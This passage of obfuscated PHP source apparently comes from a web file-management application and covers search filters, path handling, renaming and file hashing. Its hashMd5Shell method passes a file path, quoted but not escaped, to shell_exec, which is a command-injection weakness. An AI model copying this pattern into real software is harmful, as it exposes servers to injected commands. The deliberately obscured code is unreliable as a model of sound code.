$bªî¢¾¶[369])); goto C¿ôÔÎÔ¸¨; C¿ôÔÎÔ¸¨: if (!$BÇ ¿ÊÒ×…) { return $D¦ÉÏˆ¥á…; } $eêæ¶õ¿ÜÈ = array($bªî¢¾¶[463] => array($bªî¢¾¶[7], $BÇ ¿ÊÒ×…)); $E“™•å…¸Ñ = $this->field($bªî¢¾¶[2367])->where($eêæ¶õ¿ÜÈ)->select(); goto e•Şİğ„æ; e•Şİğ„æ: $D¦ÉÏˆ¥á… = array_merge($D¦ÉÏˆ¥á…, array_to_keyvalue($E“™•å…¸Ñ, $bªî¢¾¶[33], $bªî¢¾¶[369])); $D¦ÉÏˆ¥á… = array_slice($D¦ÉÏˆ¥á…, 0, $cÕµÛİáƒè); return $D¦ÉÏˆ¥á…; goto e’ÊÈ²å‹; e’ÊÈ²å‹: } private function _listSearchBindPinyin($fÙàãˆÖ•ƒ, &$FÁñå‰¸˜©, &$d–óÛÁŠÄ¸) { goto a¿šÕ‡ìé; C©ŞÕÜŞö™: $Eµ´Ôéñ· = array(); $d–óÛÁŠÄ¸ = str_replace(array($DÛËëÓ´£í[217], $DÛËëÓ´£í[50], $DÛËëÓ´£í[2368]), $DÛËëÓ´£í[33], $d–óÛÁŠÄ¸); $d–óÛÁŠÄ¸ = $DÛËëÓ´£í[2369] . str_replace($DÛËëÓ´£í[47], $DÛËëÓ´£í[2370], $d–óÛÁŠÄ¸); goto Cƒ´ˆ¢õ¦; a¿šÕ‡ìé: $DÛËëÓ´£í =& $_SERVER[ã®Â„Éæ¹¤]; if (!Input::check($fÙàãˆÖ•ƒ[$DÛËëÓ´£í[2208]], $DÛËëÓ´£í[306]) || strlen($fÙàãˆÖ•ƒ[$DÛËëÓ´£í[2208]]) < 2) { return; } $dƒ‰ ¦ºìï = "\114\x45\106\124\x20\112\117\111\116\x20{$this->tablePrefix}\151\157\137\x73\x6f\x75\162\143\145\137\x6d\x65\x74\141\40\x6d\x65\164\141\40\x6f\x6e\x20\163\157\165\162\143\x65\56\x73\x6f\x75\x72\x63\145\111\104\40\75\x20\155\145\164\x61\x2e\163\x6f\x75\162\143\x65\111\104"; goto C©ŞÕÜŞö™; CâİÒ©¬‡á: $Eµ´Ôéñ·[] = array($DÛËëÓ´£í[2371] => $cîæù´ø‚, $DÛËëÓ´£í[932] => $DÛËëÓ´£í[2212], array($DÛËëÓ´£í[2372] => $cîæù´ø‚, $DÛËëÓ´£í[2373] => array($DÛËëÓ´£í[7], array($DÛËëÓ´£í[416], $DÛËëÓ´£í[415])))); $this->join($dƒ‰ ¦ºìï); $FÁñå‰¸˜© = $Eµ´Ôéñ·; goto e¨¶Óš’õè; Cƒ´ˆ¢õ¦: unset($FÁñå‰¸˜©[$DÛËëÓ´£í[28]]); foreach ($FÁñå‰¸˜© as $cÆ¥‹ØÃÇ => $bëÀŞâê§„) { $Eµ´Ôéñ·[$DÛËëÓ´£í[2369] . $cÆ¥‹ØÃÇ] = $bëÀŞâê§„; } $cîæù´ø‚ = array($DÛËëÓ´£í[485], $DÛËëÓ´£í[2210] . $fÙàãˆÖ•ƒ[$DÛËëÓ´£í[2208]] . $DÛËëÓ´£í[2210]); goto CâİÒ©¬‡á; e¨¶Óš’õè: } private function _parseSearchWhere($bãƒø„ÜêÖ) { goto EÔÇØˆßÍ; EÔÇØˆßÍ: $c‘¶™®ÁÀ =& $_SERVER[ã®Â„Éæ¹¤]; $C‘ã—§À¾Ã = array(); if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[724]])) { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[107]] = array($c‘¶™®ÁÀ[2374], $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[724]]); } goto Fâí‘è®´; Fâí‘è®´: if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[449]])) { $dø§ÜÖî†ø = array($c‘¶™®ÁÀ[2375], $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[449]]); if ($C‘ã—§À¾Ã[$c‘¶™®ÁÀ[107]]) { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[107]] = array($C‘ã—§À¾Ã[$c‘¶™®ÁÀ[107]], $dø§ÜÖî†ø, $c‘¶™®ÁÀ[2376]); } else { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[107]] = $dø§ÜÖî†ø; } } if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[2377]])) { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[77]] = array($c‘¶™®ÁÀ[2374], $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[2377]]); } if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[2378]])) { $dø§ÜÖî†ø = array($c‘¶™®ÁÀ[2375], $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[2378]]); if ($C‘ã—§À¾Ã[$c‘¶™®ÁÀ[77]]) { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[77]] = array($C‘ã—§À¾Ã[$c‘¶™®ÁÀ[77]], $dø§ÜÖî†ø, $c‘¶™®ÁÀ[2376]); } else { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[77]] = $dø§ÜÖî†ø; } } goto CÄŒ¤´ˆãİ; CÄŒ¤´ˆãİ: if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[536]])) { $C‘ã—§À¾Ã[] = array($c‘¶™®ÁÀ[379] => $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[536]], $c‘¶™®ÁÀ[378] => $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[536]], $c‘¶™®ÁÀ[932] => $c‘¶™®ÁÀ[2212]); } if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[372]])) { $a‹á­ˆ…¦¸ = $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[372]]; if ($a‹á­ˆ…¦¸ == $c‘¶™®ÁÀ[76]) { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[370]] = 1; } else { if ($a‹á­ˆ…¦¸ == $c‘¶™®ÁÀ[2379]) { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[370]] = 0; } else { if ($a‹á­ˆ…¦¸) { $a‹á­ˆ…¦¸ = is_array($a‹á­ˆ…¦¸) ? $a‹á­ˆ…¦¸ : explode($c‘¶™®ÁÀ[47], $a‹á­ˆ…¦¸); $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[372]] = array($c‘¶™®ÁÀ[384], $a‹á­ˆ…¦¸); $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[370]] = 0; } } } } if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[463]])) { $bÆöÆ‹£ = $this->sourceInfo($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[463]]); $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[527]] = array($c‘¶™®ÁÀ[485], $bÆöÆ‹£[$c‘¶™®ÁÀ[461]] . $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[463]] . $c‘¶™®ÁÀ[486]); } goto eêñÊ‚„; eêñÊ‚„: if (isset($bãƒø„ÜêÖ[$c‘¶™®ÁÀ[2208]]) && $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[2208]]) { $B»ØÉ•‚ = $bãƒø„ÜêÖ[$c‘¶™®ÁÀ[2208]]; $c­†ÚÀÆô = explode($c‘¶™®ÁÀ[50], $B»ØÉ•‚); if (strlen($B»ØÉ•‚) > 2 && (substr($B»ØÉ•‚, 0, 1) == $c‘¶™®ÁÀ[113] && substr($B»ØÉ•‚, -1) == $c‘¶™®ÁÀ[113]) || substr($B»ØÉ•‚, 0, 1) == $c‘¶™®ÁÀ[55] && substr($B»ØÉ•‚, -1) == $c‘¶™®ÁÀ[55]) { $B»ØÉ•‚ = substr($B»ØÉ•‚, 1, -1); $c­†ÚÀÆô = array($B»ØÉ•‚); } $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[28]] = array($c‘¶™®ÁÀ[485], $c‘¶™®ÁÀ[2210] . $B»ØÉ•‚ . $c‘¶™®ÁÀ[2210]); if (count($c­†ÚÀÆô) > 1) { $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[28]] = array(); foreach ($c­†ÚÀÆô as $d–ÃäÉ÷Â½) { if (!trim($d–ÃäÉ÷Â½)) { continue; } $C‘ã—§À¾Ã[$c‘¶™®ÁÀ[28]][] = array($c‘¶™®ÁÀ[485], $c‘¶™®ÁÀ[2210] . trim($d–ÃäÉ÷Â½) . $c‘¶™®ÁÀ[2210]); } } } return $C‘ã—§À¾Ã; goto FÔ«¡¿Â¹©; FÔ«¡¿Â¹©: } } goto F±ïá‚ë×; d¡öÈÙĞğ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BÚÇÑ¨ËÏ¨ =& $_SERVER[ã®Â„Éæ¹¤]; $this->objectDriver = array($BÚÇÑ¨ËÏ¨[57], $BÚÇÑ¨ËÏ¨[58], $BÚÇÑ¨ËÏ¨[59], $BÚÇÑ¨ËÏ¨[60], $BÚÇÑ¨ËÏ¨[61], $BÚÇÑ¨ËÏ¨[62], $BÚÇÑ¨ËÏ¨[63], $BÚÇÑ¨ËÏ¨[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($AºïÃ§é³ê) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($AºïÃ§é³ê, $_SERVER[ã®Â„Éæ¹¤][8]); } return $AºïÃ§é³ê; } public function getPathName($CõÚ£º¿‚’) { return $CõÚ£º¿‚’; } public function iconvApp($BÚˆ³«ÅÁ£) { return $BÚˆ³«ÅÁ£; } public function iconvSystem($e©ŒÑÁŠ¿š) { return $e©ŒÑÁŠ¿š; } public function iconvTo($Có½¦œÆÜ·, $EÇ¥íÂ‡øª, $eÍ‰÷‚ï¤õ) { goto A¿µõÆïá˜; AÜ•ÏääƒÒ: $aÀ‡—Åø«Û = $aÀ‡—Åø«Û ? $aÀ‡—Åø«Û : $Có½¦œÆÜ·; if (strstr($aÀ‡—Åø«Û, $EÆ¥·œÛÓØ[69])) { $aÀ‡—Åø«Û = str_replace($EÆ¥·œÛÓØ[69], $EÆ¥·œÛÓØ[70], $aÀ‡—Åø«Û); } $eÕ®´²„¯½[$EÇ¥íÂ‡øª . $EÆ¥·œÛÓØ[66] . $eÍ‰÷‚ï¤õ . $EÆ¥·œÛÓØ[67] . $Có½¦œÆÜ·] = $aÀ‡—Åø«Û; goto D‘çŸÆ‚å¥; e‚ó‚ù¦’ƒ: return $aÀ‡—Åø«Û; goto Eæ¸ª¦¸¼˜; cîÒéœÎİ†: $d§±äè•Û› = $EÇ¥íÂ‡øª . $EÆ¥·œÛÓØ[66] . $eÍ‰÷‚ï¤õ . $EÆ¥·œÛÓØ[67] . $Có½¦œÆÜ·; if (isset($eÕ®´²„¯½[$d§±äè•Û›])) { return $eÕ®´²„¯½[$d§±äè•Û›]; } if (function_exists($EÆ¥·œÛÓØ[68])) { $aÀ‡—Åø«Û = @mb_convert_encoding($Có½¦œÆÜ·, $eÍ‰÷‚ï¤õ, $EÇ¥íÂ‡øª); } else { $aÀ‡—Åø«Û = @iconv($EÇ¥íÂ‡øª, $eÍ‰÷‚ï¤õ, $Có½¦œÆÜ·); } goto AÜ•ÏääƒÒ; D‘çŸÆ‚å¥: $eÕ®´²„¯½[$eÍ‰÷‚ï¤õ . $EÆ¥·œÛÓØ[66] . $EÇ¥íÂ‡øª . $EÆ¥·œÛÓØ[67] . $Có½¦œÆÜ·] = $Có½¦œÆÜ·; $eÕ®´²„¯½[$eÍ‰÷‚ï¤õ . $EÆ¥·œÛÓØ[66] . $EÇ¥íÂ‡øª . $EÆ¥·œÛÓØ[67] . $aÀ‡—Åø«Û] = $Có½¦œÆÜ·; $eÕ®´²„¯½[$EÇ¥íÂ‡øª . $EÆ¥·œÛÓØ[66] . $eÍ‰÷‚ï¤õ . $EÆ¥·œÛÓØ[67] . $aÀ‡—Åø«Û] = $aÀ‡—Åø«Û; goto e‚ó‚ù¦’ƒ; A¿µõÆïá˜: $EÆ¥·œÛÓØ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$Có½¦œÆÜ· || !function_exists($EÆ¥·œÛÓØ[65])) { return $Có½¦œÆÜ·; } static $eÕ®´²„¯½ = array(); goto cîÒéœÎİ†; Eæ¸ª¦¸¼˜: } public function getPathInner($D’ğêí‹çÛ) { $E’š™Ø¨ø = IO::init($D’ğêí‹çÛ); return $E’š™Ø¨ø->path; } public function getPathOuter($dæ“ºƒñã) { $AŸÕ±‘„Æ² =& $_SERVER[ã®Â„Éæ¹¤]; $EÍÛ„–Òãï = strlen(trim($this->pathBase, $AŸÕ±‘„Æ²[8])); $dæ“ºƒñã = substr(trim($dæ“ºƒñã, $AŸÕ±‘„Æ²[8]), $EÍÛ„–Òãï); return $this->pathDriver . $AŸÕ±‘„Æ²[8] . ltrim($dæ“ºƒñã, $AŸÕ±‘„Æ²[8]); } public function isParentOf($Báª¯ÑÃÜÎ, $fœºˆÀ˜ªÉ) { $f…ŠŸÅÌö =& $_SERVER[ã®Â„Éæ¹¤]; $Báª¯ÑÃÜÎ = rtrim(strtolower($Báª¯ÑÃÜÎ), $f…ŠŸÅÌö[8]) . $f…ŠŸÅÌö[8]; $fœºˆÀ˜ªÉ = rtrim(strtolower($fœºˆÀ˜ªÉ), $f…ŠŸÅÌö[8]) . $f…ŠŸÅÌö[8]; $Fï¸Í‡Ä§Ë = strpos($fœºˆÀ˜ªÉ, $Báª¯ÑÃÜÎ) === 0; return $Fï¸Í‡Ä§Ë; } public function getType() { $CßƒÇ =& $_SERVER[ã®Â„Éæ¹¤]; $aµÖÈ¿¾¹ = str_replace($CßƒÇ[71], $CßƒÇ[33], get_class($this)); return strtolower($aµÖÈ¿¾¹); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($DÜêàĞ†‹É, $AÇ‘” —¿) { $C¬÷—‡ğëÉ =& $_SERVER[ã®Â„Éæ¹¤]; $F­í¦Ú¹¾Ü = rtrim($DÜêàĞ†‹É, $C¬÷—‡ğëÉ[8]) . $C¬÷—‡ğëÉ[8] . $AÇ‘” —¿; $D†»é±Üãø = $this->exist($F­í¦Ú¹¾Ü); return $D†»é±Üãø ? $F­í¦Ú¹¾Ü : !1; } public function setModifyTime($báœ¢“ Û„, $bÕˆÉ«ÄÀĞ = '') { } public function renameObject($dª›¢³Šµ, $bÅ˜öÖÆ‚º) { goto CÂñÎğ‡¶; Bß¶‰²é“¢: return $a¤Š—ğ ? $bÅ˜öÖÆ‚º : !1; goto bê›ƒ„‹„á; bÎ©½âƒŞ×: $dª›¢³Šµ = $this->getPathOuter($dª›¢³Šµ); $bÅ˜öÖÆ‚º = $this->pathFather($dª›¢³Šµ) . $bÅ˜öÖÆ‚º; if (IO::isFile($dª›¢³Šµ)) { $a¤Š—ğ = IO::copy($dª›¢³Šµ, $this->pathFather($dª›¢³Šµ), REPEAT_RENAME_FOLDER, $CòÎˆíá); if ($a¤Š—ğ) { IO::remove($dª›¢³Šµ); } } else { $a¤Š—ğ = IO::mkdir($bÅ˜öÖÆ‚º); if (!$a¤Š—ğ) { return !1; } $E“‹É÷õš = IO::listPath($dª›¢³Šµ, !0); $Fë†²ö¸á = array_merge($E“‹É÷õš[$BÓ»ë¨è·[73]], $E“‹É÷õš[$BÓ»ë¨è·[74]]); foreach ($Fë†²ö¸á as $bÒñ°Ó©—) { IO::move($bÒñ°Ó©—[$BÓ»ë¨è·[75]], $bÅ˜öÖÆ‚º, REPEAT_RENAME_FOLDER); } IO::remove($dª›¢³Šµ); } goto Bß¶‰²é“¢; CÂñÎğ‡¶: $BÓ»ë¨è· =& $_SERVER[ã®Â„Éæ¹¤]; $CòÎˆíá = $bÅ˜öÖÆ‚º; Hook::trigger($BÓ»ë¨è·[72], $this, $dª›¢³Šµ, $this, $this->pathFather($dª›¢³Šµ) . $bÅ˜öÖÆ‚º); goto bÎ©½âƒŞ×; bê›ƒ„‹„á: } public function tempFile($E®‚ëëÍËÀ = '', $aÀ­¯ëÌŞ• = '') { goto D††®ùãç; aµš ®§Æ: return $aõ‘¡¯í¦ô; goto a’í¢ˆ­ƒ¸; D††®ùãç: if (!$E®‚ëëÍËÀ) { $E®‚ëëÍËÀ = rand_string(15); } $C‰ªšÖÌ‘Ó = TEMP_FILES . rand_string(15) . $_SERVER[ã®Â„Éæ¹¤][8]; @mkdir($C‰ªšÖÌ‘Ó, 511, !0); goto C‡Øø²‘½; C‡Øø²‘½: $aõ‘¡¯í¦ô = $C‰ªšÖÌ‘Ó . $E®‚ëëÍËÀ; @touch($aõ‘¡¯í¦ô); if ($aÀ­¯ëÌŞ•) { file_put_contents($aõ‘¡¯í¦ô, $aÀ­¯ëÌŞ•); } goto aµš ®§Æ; a’í¢ˆ­ƒ¸: } public function tempFileRemve($FîšŠùê•…) { @unlink($FîšŠùê•…); @rmdir($this->pathFather($FîšŠùê•…)); } public function mkfile($FÚî¿íßµ, $eæ‡Ç™‹»ò = '', $b¹×º¢×Ö¾ = REPEAT_RENAME) { } public function mkdir($bÚ¸¾™Éá, $Cñ·Ä‰¯’ò = REPEAT_SKIP) { } public function delFile($D•àñ³ŒØÖ) { } public function delFolder($F†¸´»¹£©) { } public function copyFile($FØÒ×Õ¬Š, $døÄ…ÙÏÔ‰) { } public function moveFile($DôĞá¼ßŒã, $eŠˆ£¦ãË¦) { } public function remove($B£…¯“œ±º) { if ($this->isFile($B£…¯“œ±º)) { return $this->delFile($B£…¯“œ±º); } return $this->delFolder($B£…¯“œ±º); } public function rename($fö‚…‹òÛ–, $A¹¿”¼Ğ ¡) { } public function exist($Bºªµ«Õ¯) { } public function findByHash($FÒ‡Øˆç…À = '', $Bí›šè³àá = '') { return !1; } public function isFile($bŠÊƒ‚îÓœ) { } public function isFolder($eÍäÌ“ƒ¬) { } public function size($d¬ç£§Şô) { } public function info($bƒ©±™áæ¢) { } public function infoSimple($B¿ÉÙ“ËÀÄ) { return $this->info($B¿ÉÙ“ËÀÄ); } public function infoAuth($bÏ´Ê¿’„ö) { return $this->info($bÏ´Ê¿’„ö); } public function infoFull($fÑĞ½ÌĞ ˆ) { return $this->info($fÑĞ½ÌĞ ˆ); } public function infoWithChildren($Fçˆ–º‘â”) { $AÈù¡º¤¤Š =& $_SERVER[ã®Â„Éæ¹¤]; static $a¡ôÈœøº = array(); if (isset($a¡ôÈœøº[$Fçˆ–º‘â”])) { return $a¡ôÈœøº[$Fçˆ–º‘â”]; } $FŞÁÜÌØ…« = $this->info($Fçˆ–º‘â”); if ($FŞÁÜÌØ…« && $FŞÁÜÌØ…«[$AÈù¡º¤¤Š[29]] == $AÈù¡º¤¤Š[76]) { $d¢…ùÚëùƒ = array($AÈù¡º¤¤Š[77] => 0, $AÈù¡º¤¤Š[78] => 0, $AÈù¡º¤¤Š[79] => 0); $this->infoChildren($Fçˆ–º‘â”, $d¢…ùÚëùƒ); $FŞÁÜÌØ…«[$AÈù¡º¤¤Š[77]] = $d¢…ùÚëùƒ[$AÈù¡º¤¤Š[77]]; $FŞÁÜÌØ…«[$AÈù¡º¤¤Š[80]] = array($AÈù¡º¤¤Š[81] => $d¢…ùÚëùƒ[$AÈù¡º¤¤Š[78]], $AÈù¡º¤¤Š[82] => $d¢…ùÚëùƒ[$AÈù¡º¤¤Š[79]]); $a¡ôÈœøº[$Fçˆ–º‘â”] = $FŞÁÜÌØ…«; } return $FŞÁÜÌØ…«; } public function listPath($Cª¼Õ ¤«, $aÏ„áäĞ† = false) { } public function has($Cí³¤ˆ»´é, $AË‘ê¿–Í = false, $cƒÍ§œƒµ = false) { } public function canRead($AÅ™™½ùÜ) { } public function canWrite($E·ÚšµÆÕ¹) { } public function getContent($e¹„ğ¶íŸ˜) { } public function setContent($BéÎœ¸Ï´ì, $cóÓ’ã É³ = '') { } protected function infoChildren($D¦¯²Ğ’—, &$BùÑœÂíçŞ) { $DŠ»ˆ…êø =& $_SERVER[ã®Â„Éæ¹¤]; check_abort(); $E‰ï¿¥º´ = $this->listPath($D¦¯²Ğ’—, !0); $E‰ï¿¥º´ = array_merge($E‰ï¿¥º´[$DŠ»ˆ…êø[74]], $E‰ï¿¥º´[$DŠ»ˆ…êø[73]]); foreach ($E‰ï¿¥º´ as $E³Œò·ùš) { if ($E³Œò·ùš[$DŠ»ˆ…êø[29]] == $DŠ»ˆ…êø[76]) { $BùÑœÂíçŞ[$DŠ»ˆ…êø[79]]++; $dÅ½¨»ÜÄ = $this->getPathInner($E³Œò·ùš[$DŠ»ˆ…êø[75]]); $this->infoChildren($dÅ½¨»ÜÄ, $BùÑœÂíçŞ); } else { $BùÑœÂíçŞ[$DŠ»ˆ…êø[78]]++; $BùÑœÂíçŞ[$DŠ»ˆ…êø[77]] += $E³Œò·ùš[$DŠ»ˆ…êø[77]]; } } } public function fileSubstr($d‘†¶¹åŒ, $D‘‚•ââÏ, $aÓ”éÙµÀÕ) { } public function listAll($dÜàÚÚ†ÅÛ) { } public function upload($b§‰ï¥Ñ÷, $DÔàŠÚ½µ°, $a˜±Ğ÷‘¤Î = false, $aÀ Üòì»‘ = REPEAT_REPLACE) { } public function uploadFileByID($B‘É‹¶¸¨, $fõ½ãÄß‘©, $A®Ô‘¦ŞÏÌ) { } public function uploadFileByPath($f®Õ†Í¾£, $D±‹Š“¶, $c«èÄ÷ÎêÔ = array()) { } public function isUploadServer() { $D¦™¹ë“ó =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $D¦™¹ë“ó[83]) { return !0; } return $GLOBALS[$D¦™¹ë“ó[6]][$D¦™¹ë“ó[84]][$D¦™¹ë“ó[85]]; } public function isFileOutServer() { $b®ˆÆ²«Á‹ =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $b®ˆÆ²«Á‹[83]) { return !0; } return $GLOBALS[$b®ˆÆ²«Á‹[6]][$b®ˆÆ²«Á‹[84]][$b®ˆÆ²«Á‹[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($c³åà½‡ˆ¶) { $aÌ¥ŠÈÚ”ñ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->isCdnHost()) { return $c³åà½‡ˆ¶; } return str_replace(trim(get_url_root($c³åà½‡ˆ¶), $aÌ¥ŠÈÚ”ñ[8]), trim($this->cdnHost, $aÌ¥ŠÈÚ”ñ[8]), $c³åà½‡ˆ¶); } public function uploadLink($d—½ïğ›Ó, $F°Âë¾Ã®¾ = 0) { goto cŒÒîğø‰Œ; c¢‰ÀÂÙöò: if (!in_array($CÕÇ×Âí, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $cä¯‡ÓÁ = 1024 * 1024 * 10; goto f”ÍâóŠÕ÷; F‘Ü¬´íóİ: if ($e•ŸˆÖŒÇ•) { $e•ŸˆÖŒÇ•[$F…×‡ÄÅ»»[89]] = $d—½ïğ›Ó; $e•ŸˆÖŒÇ•[$F…×‡ÄÅ»»[90]] = $CÕÇ×Âí; } return $e•ŸˆÖŒÇ•; goto aÛ‹ÈšËÃ; f”ÍâóŠÕ÷: $D¶†ãéª¬Æ = $F°Âë¾Ã®¾ <= $cä¯‡ÓÁ ? $F…×‡ÄÅ»»[87] : $F…×‡ÄÅ»»[88]; $B ÒÀ«¢¡Ã = (!$F°Âë¾Ã®¾ ? 1 : ceil($F°Âë¾Ã®¾ / pow(1024, 3))) * 3600 * 4; $e•ŸˆÖŒÇ• = $this->{$D¶†ãéª¬Æ}($d—½ïğ›Ó, $B ÒÀ«¢¡Ã); goto F‘Ü¬´íóİ; cŒÒîğø‰Œ: $F…×‡ÄÅ»» =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->isUploadServer()) { return; } $CÕÇ×Âí = $this->getType(); goto c¢‰ÀÂÙöò; aÛ‹ÈšËÃ: } public function uploadFormData($fˆÅ¶¶¶¼‘, $e„Ô‘†ğÒÖ = 3600) { } public function multiUploadFormData($e§ÛŠÜ­õ¸, $aÉÒ™œ´Ïæ = 3600) { } public function download($DÁ³—çšÏ…, $fÕÁï¡³›Å) { } public function ext($D³ÙÚÇ”Ú¯) { $f½Ä¨¾Ş•Á =& $_SERVER[ã®Â„Éæ¹¤]; if (strpos($D³ÙÚÇ”Ú¯, $f½Ä¨¾Ş•Á[8]) === -1) { $cÜµ¸‡Ü = $D³ÙÚÇ”Ú¯; } else { $cÜµ¸‡Ü = $this->pathThis($D³ÙÚÇ”Ú¯); } $a¿á÷¯éïô = $f½Ä¨¾Ş•Á[33]; if (strstr($cÜµ¸‡Ü, $f½Ä¨¾Ş•Á[91])) { $a¿á÷¯éïô = substr($cÜµ¸‡Ü, strrpos($cÜµ¸‡Ü, $f½Ä¨¾Ş•Á[91]) + 1); $a¿á÷¯éïô = strtolower($a¿á÷¯éïô); } if (strlen($a¿á÷¯éïô) > 3 && preg_match($f½Ä¨¾Ş•Á[92], $a¿á÷¯éïô, $Dã±¢°¾¦Ì)) { $a¿á÷¯éïô = $f½Ä¨¾Ş•Á[33]; } return $a¿á÷¯éïô; } public function pathThis($bïÜÙİ¹¾Ú) { $cªì‰§éñ =& $_SERVER[ã®Â„Éæ¹¤]; $bïÜÙİ¹¾Ú = str_replace($cªì‰§éñ[93], $cªì‰§éñ[8], rtrim($bïÜÙİ¹¾Ú, $cªì‰§éñ[8])); $CêÄò©­Š§ = strrpos($bïÜÙİ¹¾Ú, $cªì‰§éñ[8]); if ($CêÄò©­Š§ === !1) { return $bïÜÙİ¹¾Ú; } return substr($bïÜÙİ¹¾Ú, $CêÄò©­Š§ + 1); } public function pathFather($A—ò„Ò…Ï) { $F¨ŸËŞçÂï =& $_SERVER[ã®Â„Éæ¹¤]; $A—ò„Ò…Ï = str_replace($F¨ŸËŞçÂï[93], $F¨ŸËŞçÂï[8], rtrim($A—ò„Ò…Ï, $F¨ŸËŞçÂï[8])); $câÓŸäÍ±À = strrpos($A—ò„Ò…Ï, $F¨ŸËŞçÂï[8]); if ($câÓŸäÍ±À === !1) { return $F¨ŸËŞçÂï[33]; } return substr($A—ò„Ò…Ï, 0, $câÓŸäÍ±À + 1); } public function hashSimple($E—›¨¾­) { goto AŞ»¬œ…æÍ; E®¾¨ÆŒ¨: $D¿Äİµã .= $this->fileSubstr($E—›¨¾­, $DÅ®«•«Ëó - $b‡Ì«¤Ÿ¼‚, $b‡Ì«¤Ÿ¼‚); return md5($D¿Äİµã) . $DÅ®«•«Ëó; goto E‰«²õÙè; FÀ·¡Å—±: $b‡Ì«¤Ÿ¼‚ = 200; $fˆÏÏ¸½ï = 50; if ($DÅ®«•«Ëó <= $b‡Ì«¤Ÿ¼‚ * $fˆÏÏ¸½ï) { return $this->hashMd5($E—›¨¾­) . $DÅ®«•«Ëó; } goto bµ‚Ø©æŠ; bµ‚Ø©æŠ: $F«ŒÛˆÏíÀ = intval($DÅ®«•«Ëó / $fˆÏÏ¸½ï); $D¿Äİµã = $b¨œ‹±ºĞÒ[33]; for ($bºØƒ–ÎÉ = 0; $bºØƒ–ÎÉ < $fˆÏÏ¸½ï; $bºØƒ–ÎÉ++) { $D¿Äİµã .= $this->fileSubstr($E—›¨¾­, $F«ŒÛˆÏíÀ * $bºØƒ–ÎÉ, $b‡Ì«¤Ÿ¼‚); } goto E®¾¨ÆŒ¨; AŞ»¬œ…æÍ: $b¨œ‹±ºĞÒ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$E—›¨¾­) { return md5($b¨œ‹±ºĞÒ[33]); } $DÅ®«•«Ëó = $this->size($E—›¨¾­); goto FÀ·¡Å—±; E‰«²õÙè: } public static $md5Cache = array(); public function hashMd5($F®—ßâ¸”á) { $F®—ßâ¸”á = $this->iconvSystem($F®—ßâ¸”á); if (isset(self::$md5Cache[$F®—ßâ¸”á])) { return self::$md5Cache[$F®—ßâ¸”á]; } self::$md5Cache[$F®—ßâ¸”á] = $this->hashMd5Shell($F®—ßâ¸”á); if (!self::$md5Cache[$F®—ßâ¸”á]) { self::$md5Cache[$F®—ßâ¸”á] = @md5_file($F®—ßâ¸”á); } return self::$md5Cache[$F®—ßâ¸”á]; } private function hashMd5Shell($BÙåØõŞÖ) { goto DŒËÃ†ƒÜÙ; C¬§Ûèó‘å: $d÷¯˜é­ÁÆ = shell_exec($a—ÕÅ¤°Ê´ . "\40\x22{$BÙåØõŞÖ}\42"); $d÷¯˜é­ÁÆ = str_replace($D†¹¥Å§Ìä[100], $D†¹¥Å§Ìä[33], $d÷¯˜é­ÁÆ); return substr($d÷¯˜é­ÁÆ, 0, 32); goto C·ñçˆ·Éâ; fÅ½¥¬Á™: $a—ÕÅ¤°Ê´ = Cache::get($D†¹¥Å§Ìä[97]); if (!$a—ÕÅ¤°Ê´) { $dñğŠğ¦ˆ = BASIC_PATH . $D†¹¥Å§Ìä[98]; $d‹•·Ÿè¨“ = md5_file($dñğŠğ¦ˆ); $a—ÕÅ¤°Ê´ = $D†¹¥Å§Ìä[99]; foreach ($böåÈ—Ò™ as $dœÕ¡”½ÇÔ) { $d÷¯˜é­ÁÆ = shell_exec($dœÕ¡”½ÇÔ . "\40\42{$dñğŠğ¦ˆ}\42"); if ($d÷¯˜é­ÁÆ && substr(trim($d÷¯˜é­ÁÆ), 0, 32) == $d‹•·Ÿè¨“) { $a—ÕÅ¤°Ê´ = $dœÕ¡”½ÇÔ; break; } } Cache::set($D†¹¥Å§Ìä[97], $a—ÕÅ¤°Ê´, 3600); } if ($a—ÕÅ¤°Ê´ == $D†¹¥Å§Ìä[99]) { return !1; } goto 